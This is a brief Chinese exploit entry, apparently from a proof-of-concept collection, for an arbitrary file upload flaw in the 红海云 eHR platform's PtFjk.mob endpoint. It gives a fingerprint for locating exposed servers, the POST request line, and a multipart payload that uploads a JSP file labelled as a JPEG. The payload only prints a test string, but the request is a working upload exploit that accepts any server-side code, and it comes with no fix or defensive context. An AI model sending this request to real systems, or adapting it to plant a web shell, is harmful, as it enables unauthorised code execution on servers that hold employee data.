# 红海云eHR-PtFjk.mob存在任意文件上传漏洞

红海云eHR-PtFjk.mob ｜ 文件上传 ｜ —
- **指纹**：`body="/RedseaPlatform/skins/images/favicon.ico"`
- **请求**：`POST /RedseaPlatform/PtFjk.mob?method=upload HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryt7WbDl1tXogoZys4
Content-Disposition: form-data; name="fj_file"; filename="11.jsp"
Content-Type:image/jpeg
<% out.print("hello,eHR");%>
------WebKitFormBoundaryt7WbDl1tXogoZys4--
```